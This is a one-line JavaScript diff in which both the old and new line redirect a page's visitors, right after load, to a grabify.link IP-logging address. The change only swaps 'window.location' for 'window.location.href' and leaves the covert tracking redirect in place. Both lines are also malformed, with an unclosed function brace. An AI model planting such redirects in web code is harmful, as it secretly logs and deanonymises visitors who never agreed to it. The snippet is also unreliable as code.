@@ -1,1 +1,1 @@
-setTimeout(function(){window.location = "https://grabify.link/7WBCCN", 1)
+setTimeout(function(){window.location.href = "https://grabify.link/7WBCCN", 1)
